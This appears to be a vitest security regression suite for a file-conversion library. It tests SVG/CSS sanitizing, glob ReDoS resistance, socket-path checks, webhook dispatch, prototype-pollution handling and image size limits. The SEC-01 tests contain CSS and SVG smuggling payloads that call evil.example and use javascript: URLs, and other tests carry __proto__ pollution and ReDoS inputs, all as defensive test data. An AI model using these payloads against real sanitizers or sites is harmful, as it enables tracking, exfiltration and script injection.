import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, it } from 'vitest';
import JSZip from 'jszip';
import { Agent } from 'undici';
import { sanitizeSvgString } from '../src/lib/security/svg-sanitizer';
import { matchArchiveGlob } from '../src/lib/conversions/archive';
import { confinedSocketDirectory } from '../src/lib/security/process-sandbox';
import { WebhookDispatcher } from '../src/lib/api-keys/webhook-dispatcher';
import { convertXlsxSource } from '../src/lib/conversions/office/xlsx-convert';
import { convertOdsSource } from '../src/lib/conversions/office/odf-convert';
import { safeExtractXmlAttributes } from '../src/lib/conversions/safe-xml-scanner';
import { assertPng16Dimensions } from '../src/lib/conversions/png16';
import { encodePsd } from '../src/lib/conversions/psd-writer';
import { PayloadLimitError, SandboxUnavailableError } from '../src/lib/types';
import { runIdentify, SKIP_WITHOUT_MAGICK } from './helpers/imagemagick';
import { expectNoHang } from './helpers/timing';

async function buildRawXlsxWithHeaders(headers: string[], values: string[]): Promise<Buffer> {
  const zip = new JSZip();
  zip.file(
    '[Content_Types].xml',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
      '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
      '<Default Extension="xml" ContentType="application/xml"/>' +
      '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>' +
      '<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>' +
      '</Types>'
  );
  zip.file(
    '_rels/.rels',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>' +
      '</Relationships>'
  );
  zip.file(
    'xl/workbook.xml',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">' +
      '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>' +
      '</workbook>'
  );
  zip.file(
    'xl/_rels/workbook.xml.rels',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
      '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>' +
      '</Relationships>'
  );
  const colLetter = (idx: number) => String.fromCharCode(65 + idx);
  const rowXml = (rowNum: number, cells: string[]) =>
    `<row r="${rowNum}">` +
    cells
      .map(
        (v, idx) =>
          `<c r="${colLetter(idx)}${rowNum}" t="inlineStr"><is><t>${v}</t></is></c>`
      )
      .join('') +
    '</row>';
  zip.file(
    'xl/worksheets/sheet1.xml',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData>' +
      rowXml(1, headers) +
      rowXml(2, values) +
      '</sheetData></worksheet>'
  );
  return Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }));
}

async function buildRawOdsWithHeaders(headers: string[], values: string[]): Promise<Buffer> {
  const zip = new JSZip();
  zip.file('mimetype', 'application/vnd.oasis.opendocument.spreadsheet');
  const rowXml = (cells: string[]) =>
    '<table:table-row>' +
    cells.map((v) => `<table:table-cell><text:p>${v}</text:p></table:table-cell>`).join('') +
    '</table:table-row>';
  zip.file(
    'content.xml',
    '<?xml version="1.0" encoding="UTF-8"?>' +
      '<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" ' +
      'xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" ' +
      'xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0">' +
      '<office:body><office:spreadsheet><table:table table:name="Sheet1">' +
      rowXml(headers) +
      rowXml(values) +
      '</table:table></office:spreadsheet></office:body></office:document-content>'
  );
  return Buffer.from(await zip.generateAsync({ type: 'nodebuffer' }));
}

describe('SEC-01: SVG sanitizer CSS string/url comment smuggling and nested paired tags', () => {
  it('strips @import and external url() placed between CSS string literals containing /* and */', () => {
    const svg =
      '<svg><style>' +
      'a::before { content: "/*"; } ' +
      '@import url("https://evil.example/exfil.css"); ' +
      'rect { fill: url("https://evil.example/pixel.png"); } ' +
      'b::after { content: "*/"; }' +
      '</style><rect width="10" height="10"/></svg>';
    const sanitized = sanitizeSvgString(svg);
    expect(sanitized).toBe(
      '<svg><style>' +
        'a::before { content: "/*"; }  ' +
        'rect { fill: none; } ' +
        'b::after { content: "*/"; }' +
        '</style><rect width="10" height="10"/></svg>'
    );
  });

  it('prevents unquoted url(#x") and url(#x/*) from desynchronizing CSS quote/comment state', () => {
    const quoteDesync =
      '<svg><style>' +
      'a { fill: url(#x"); } ' +
      'b::before { content: "/*"; } ' +
      '@import url("https://evil.example/desync.css"); ' +
      'c::after { content: "*/"; }' +
      '</style></svg>';
    expect(sanitizeSvgString(quoteDesync)).toBe(
      '<svg><style>' +
        'a { fill: url(#x"); } ' +
        'b::before { content: "/*"; }  ' +
        'c::after { content: "*/"; }' +
        '</style></svg>'
    );

    const commentInUrl =
      '<svg><style>' +
      'a { fill: url(#x/*); } ' +
      '@import url("https://evil.example/url-comment.css"); ' +
      '/* */' +
      '</style></svg>';
    expect(sanitizeSvgString(commentInUrl)).toBe('<svg><style>a { fill: url(#x/*); }  /* */</style></svg>');
  });

  it('terminates unclosed CSS string on unescaped newline so subsequent /*...*/ cannot mask @import', () => {
    const newlineString =
      '<svg><style>' +
      'a::before { content: "unterminated\n' +
      '; } b::before { content: "/*"; } ' +
      '@import url("https://evil.example/newline.css"); ' +
      'c::after { content: "*/"; }' +
      '</style></svg>';
    expect(sanitizeSvgString(newlineString)).toBe(
      '<svg><style>' +
        'a::before { content: "unterminated\n' +
        '; } b::before { content: "/*"; }  ' +
        'c::after { content: "*/"; }' +
        '</style></svg>'
    );
  });

  it('neutralizes full url() when quoted URL contains ")" and blocks javascript:/vbscript: in CSS url()', () => {
    const parenUrl = '<svg><style>g{background:url("https://evil.example/a)b")}</style></svg>';
    expect(sanitizeSvgString(parenUrl)).toBe('<svg><style>g{background:none}</style></svg>');

    const semicolonsInImport = '<svg><style>@import "https://evil.example/a;b.css";g{fill:blue}</style></svg>';
    expect(sanitizeSvgString(semicolonsInImport)).toBe('<svg><style>g{fill:blue}</style></svg>');

    const jsUrl = '<svg><style>g{background:url(\\6a avascript:alert(1));cursor:url("vbscript:msgbox(1)"),auto}</style></svg>';
    const out = sanitizeSvgString(jsUrl);
    expect(out).not.toContain('alert(1)');
    expect(out).not.toContain('msgbox');
    expect(out).toBe('<svg><style>g{background:none;cursor:none,auto}</style></svg>');
  });

  it('removes nested <foreignObject> and orphan closing tags completely in a single pass', () => {
    const nested =
      '<svg>' +
      '<foreignObject><foreignObject><div>inner</div></foreignObject>' +
      '<div id="leaked-html"><img src="https://evil.example/track"/></div>' +
      '</foreignObject>' +
      '</foreignObject>' +
      '<rect width="5" height="5"/>' +
      '</svg>';
    const out = sanitizeSvgString(nested);
    expect(out).not.toContain('leaked-html');
    expect(out).not.toContain('foreignObject');
    expect(out).toBe('<svg><rect width="5" height="5"/></svg>');
  });
});

describe('SEC-02: matchArchiveGlob linear-time wildcard matching without ReDoS', () => {
  it('evaluates pathological repeated-wildcard glob patterns without catastrophic backtracking', async () => {
    const pathologicalSingle = `${'*a'.repeat(48)}*b`;
    const pathologicalDouble = `**/${'*a'.repeat(48)}*b`;
    const nonMatchingInput = `dir/${'a'.repeat(128)}c`;
    const [matchedSingle, matchedDouble] = await expectNoHang('matchArchiveGlob pathological wildcards', () => [
      matchArchiveGlob(nonMatchingInput, [pathologicalSingle]),
      matchArchiveGlob(nonMatchingInput, [pathologicalDouble]),
    ]);
    expect(matchedSingle).toBe(false);
    expect(matchedDouble).toBe(false);
  });

  it('preserves *, **, ?, basename, and path-qualified glob semantics', () => {
    expect(matchArchiveGlob('docs/sub/report.pdf', ['*.pdf'])).toBe(true);
    expect(matchArchiveGlob('docs/sub/report.pdf', ['docs/*/report.pdf'])).toBe(true);
    expect(matchArchiveGlob('docs/a/b/report.pdf', ['docs/*/report.pdf'])).toBe(false);
    expect(matchArchiveGlob('docs/a/b/report.pdf', ['docs/**/report.pdf'])).toBe(true);
    expect(matchArchiveGlob('file-1.txt', ['file-?.txt'])).toBe(true);
    expect(matchArchiveGlob('file-12.txt', ['file-?.txt'])).toBe(false);
    expect(matchArchiveGlob('dir/a+b(1)[x].txt', ['a+b(1)[x].txt'])).toBe(true);
  });
});

describe('SEC-03: confinedSocketDirectory rejects root, relative, and NUL paths', () => {
  it('rejects "/", relative paths, and NUL-containing socket directories while allowing "/tmp"', () => {
    expect(() => confinedSocketDirectory('/', 'socket directory')).toThrow(SandboxUnavailableError);
    expect(() => confinedSocketDirectory('relative/socket', 'socket directory')).toThrow(SandboxUnavailableError);
    expect(() => confinedSocketDirectory('/tmp/sock\0bad', 'socket directory')).toThrow(SandboxUnavailableError);
    expect(confinedSocketDirectory('/tmp', 'socket directory')).toBe('/tmp');
  });
});

describe('SEC-04: WebhookDispatcher pairs undici.fetch with its undici Agent when globalThis.fetch is native', () => {
  it('routes native dispatch through undici.fetch so custom Agent lookup runs without version-skew TypeError', async () => {
    let lookupCalls = 0;
    const server = http.createServer((_req, res) => {
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end('ok');
    });
    await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
    const addr = server.address();
    const port = typeof addr === 'object' && addr ? addr.port : 0;

    const customAgent = new Agent({
      connect: {
        lookup: (_hostname, _opts, cb) => {
          lookupCalls += 1;
          cb(null, [{ address: '127.0.0.1', family: 4 }]);
        },
      },
    });
    const dispatcher = new WebhookDispatcher(customAgent);
    try {
      const outcome = await (dispatcher as unknown as {
        executeFetchAttempt: (
          url: string,
          headers: Record<string, string>,
          body: string,
          timeoutMs: number,
          attempt: number
        ) => Promise<{ attemptEntry: { statusCode?: number; error?: string }; statusAction: string }>;
      }).executeFetchAttempt(`http://localhost:${port}/webhook`, { 'content-type': 'application/json' }, '{}', 3000, 1);

      expect(lookupCalls).toBeGreaterThanOrEqual(1);
      expect(outcome.attemptEntry.statusCode).toBe(200);
      expect(outcome.statusAction).toBe('success');
    } finally {
      await dispatcher.close();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
  });
});

describe('SEC-08: Spreadsheet JSON and XML attribute maps prevent __proto__ mutation', () => {
  it('preserves literal "__proto__" and "constructor" keys in XLSX -> JSON, ODS -> JSON, and safeExtractXmlAttributes', async () => {
    const xlsx = await buildRawXlsxWithHeaders(['__proto__', 'constructor', 'normal'], ['polluted', 'ctor_val', 'ok']);
    const xlsxJsonRes = await convertXlsxSource(xlsx, 'json', {}, 'proto');
    const xlsxParsed = JSON.parse(xlsxJsonRes.buffer.toString('utf-8')) as Array<Record<string, unknown>>;
    expect(xlsxJsonRes.buffer.toString('utf-8')).toContain('"__proto__": "polluted"');
    expect(Object.getOwnPropertyDescriptor(xlsxParsed[0], '__proto__')?.value).toBe('polluted');
    expect(xlsxParsed[0].normal).toBe('ok');

    const ods = await buildRawOdsWithHeaders(['__proto__', 'normal'], ['ods_polluted', 'ods_ok']);
    const odsJsonRes = await convertOdsSource(ods, 'json', {}, 'proto');
    expect(odsJsonRes.buffer.toString('utf-8')).toContain('"__proto__": "ods_polluted"');

    const attrs = safeExtractXmlAttributes('<cell __proto__="xml_polluted" id="c1"/>');
    expect(Object.getPrototypeOf(attrs)).toBe(Object.prototype);
    expect((attrs as Record<string, unknown>).xml_polluted).toBeUndefined();
    expect(Object.getOwnPropertyDescriptor(attrs, '__proto__')?.value).toBe('xml_polluted');
    expect(attrs.id).toBe('c1');
  });
});

describe('SEC-09: PNG16 and PSD encoders enforce byte limits and wide 16-bit PackBits rows without RangeError', () => {
  it('rejects >2 GiB 16-bit PNG scanline dimensions upfront with PayloadLimitError', () => {
    const width = 20_000;
    const height = 20_000;
    expect(() => assertPng16Dimensions(width, height, width * height * 3)).toThrow(PayloadLimitError);
  });

  it('rejects oversized PSD raw byte totals with PayloadLimitError before allocation', () => {
    const fakeSamples = { length: 26_000 * 26_000 * 4 * 2 } as unknown as Uint8Array;
    expect(() =>
      encodePsd({
        width: 26_000,
        height: 26_000,
        channels: 4,
        depth: 16,
        samples: fakeSamples,
      })
    ).toThrow(PayloadLimitError);
  });

  it('encodes wide 16-bit incompressible PSD rows (25000x1) without PackBits uint16 RangeError', () => {
    const width = 25_000;
    const height = 1;
    const channels = 3;
    // Pattern [A, B, B] per planar byte expands 50,000 bytes -> 66,667 bytes (> 65,535 uint16 max) under PackBits.
    const samples = new Uint8Array(width * height * channels * 2);
    for (let x = 0; x < width; x++) {
      const m = x % 3;
      const hi = m === 0 ? 0x11 : 0x22;
      const lo = m === 0 ? 0x22 : m === 1 ? 0x11 : 0x22;
      for (let c = 0; c < channels; c++) {
        const at = (x * channels + c) * 2;
        // Little-endian input -> big-endian plane gets [hi, lo] = [0x11, 0x22, 0x22, 0x11, 0x22, 0x22, ...]
        samples[at] = lo;
        samples[at + 1] = hi;
      }
    }
    const psd = encodePsd({ width, height, channels, depth: 16, samples });
    expect(psd.toString('ascii', 0, 4)).toBe('8BPS');
    expect(psd.readUInt32BE(18)).toBe(width);
    if (!SKIP_WITHOUT_MAGICK) {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'psd-raw-row-'));
      try {
        const psdPath = path.join(tmpDir, 'wide16.psd');
        fs.writeFileSync(psdPath, psd);
        expect(runIdentify(['-format', '%z %w %h', psdPath]).trim()).toBe(`16 ${width} ${height}`);
      } finally {
        fs.rmSync(tmpDir, { recursive: true, force: true });
      }
    }
  });
});
